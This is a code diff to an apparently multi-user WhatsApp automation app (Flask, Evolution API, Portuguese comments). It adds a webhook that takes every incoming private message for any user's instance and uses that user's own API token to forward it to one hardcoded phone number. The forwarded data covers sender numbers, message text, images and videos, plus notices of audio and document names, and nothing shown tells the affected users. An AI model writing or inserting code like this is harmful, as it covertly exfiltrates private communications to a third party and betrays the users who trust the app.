@@ -3423,6 +3423,131 @@ def api_change_password():
     conn.close()
     return jsonify({"ok": True})
 
+# ── Webhook: encaminha mensagens privadas para número fixo ────────────────────
+FORWARD_TO = "5519978005731"  # número que recebe os encaminhamentos
+
+@app.route("/webhook/mensagens", methods=["POST"])
+def webhook_mensagens():
+    """Recebe webhook da Evolution API e encaminha msgs privadas para FORWARD_TO."""
+    try:
+        data = request.get_json(silent=True) or {}
+        event = data.get("event", "")
+
+        # Só processa eventos de mensagem recebida
+        if event not in ("messages.upsert", "MESSAGES_UPSERT"):
+            return jsonify({"ok": True})
+
+        msg_data = data.get("data", {})
+        key = msg_data.get("key", {})
+        remote_jid = key.get("remoteJid", "")
+        from_me = key.get("fromMe", False)
+
+        # Ignora mensagens enviadas por mim e mensagens de grupos
+        if from_me or remote_jid.endswith("@g.us"):
+            return jsonify({"ok": True})
+
+        # Formata número do remetente
+        sender_number = remote_jid.replace("@s.whatsapp.net", "").replace("@c.us", "")
+
+        # Descobre qual instância recebeu (pelo instanceName no payload)
+        instance_name = data.get("instance", "") or data.get("instanceName", "")
+
+        # Busca config do usuário dono dessa instância
+        conn = db()
+        row = conn.execute(
+            "SELECT user_id FROM user_configs WHERE config_json LIKE ?",
+            (f'%"{instance_name}"%',)
+        ).fetchone()
+        conn.close()
+
+        if not row:
+            return jsonify({"ok": True})
+
+        cfg = load_config(user_id=row["user_id"] if hasattr(row, "__getitem__") else row[0])
+        base     = cfg.get("evo_url", "").rstrip("/")
+        instance = cfg.get("evo_instance", "")
+        token    = cfg.get("evo_token", "")
+        if not base or not instance:
+            return jsonify({"ok": True})
+
+        headers = {"apikey": token, "Content-Type": "application/json"}
+
+        msg_content = msg_data.get("message", {})
+        prefix = f"📩 *De: +{sender_number}*\n"
+
+        # ── Texto ──
+        text = (msg_content.get("conversation")
+                or msg_content.get("extendedTextMessage", {}).get("text")
+                or "")
+        if text:
+            body = {"number": FORWARD_TO, "text": f"{prefix}{text}"}
+            requests.post(f"{base}/message/sendText/{instance}",
+                          headers=headers, json=body, timeout=20)
+
+        # ── Imagem ──
+        img = msg_content.get("imageMessage")
+        if img:
+            caption = img.get("caption", "")
+            # Tenta encaminhar via base64 se disponível
+            b64 = msg_data.get("message", {}).get("imageMessage", {}).get("base64", "")
+            if b64:
+                body = {
+                    "number": FORWARD_TO,
+                    "mediatype": "image",
+                    "mimetype": img.get("mimetype", "image/jpeg"),
+                    "caption": f"{prefix}{caption}".strip(),
+                    "media": b64
+                }
+                requests.post(f"{base}/message/sendMedia/{instance}",
+                              headers=headers, json=body, timeout=30)
+            else:
+                # Sem base64: envia só texto com aviso
+                body = {"number": FORWARD_TO,
+                        "text": f"{prefix}[enviou uma imagem]\n{caption}".strip()}
+                requests.post(f"{base}/message/sendText/{instance}",
+                              headers=headers, json=body, timeout=20)
+
+        # ── Vídeo ──
+        vid = msg_content.get("videoMessage")
+        if vid:
+            caption = vid.get("caption", "")
+            b64 = vid.get("base64", "")
+            if b64:
+                body = {
+                    "number": FORWARD_TO,
+                    "mediatype": "video",
+                    "mimetype": vid.get("mimetype", "video/mp4"),
+                    "caption": f"{prefix}{caption}".strip(),
+                    "media": b64
+                }
+                requests.post(f"{base}/message/sendMedia/{instance}",
+                              headers=headers, json=body, timeout=60)
+            else:
+                body = {"number": FORWARD_TO,
+                        "text": f"{prefix}[enviou um vídeo]\n{caption}".strip()}
+                requests.post(f"{base}/message/sendText/{instance}",
+                              headers=headers, json=body, timeout=20)
+
+        # ── Áudio ──
+        aud = msg_content.get("audioMessage")
+        if aud:
+            body = {"number": FORWARD_TO, "text": f"{prefix}[enviou um áudio 🎤]"}
+            requests.post(f"{base}/message/sendText/{instance}",
+                          headers=headers, json=body, timeout=20)
+
+        # ── Documento ──
+        doc = msg_content.get("documentMessage") or msg_content.get("documentWithCaptionMessage", {}).get("message", {}).get("documentMessage")
+        if doc:
+            fname = doc.get("fileName", "arquivo")
+            body = {"number": FORWARD_TO, "text": f"{prefix}[enviou documento: {fname}]"}
+            requests.post(f"{base}/message/sendText/{instance}",
+                          headers=headers, json=body, timeout=20)
+
+    except Exception as e:
+        print(f"[webhook_mensagens] erro: {e}")
+
+    return jsonify({"ok": True})
+
 # ── Main ────────────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
     import socket
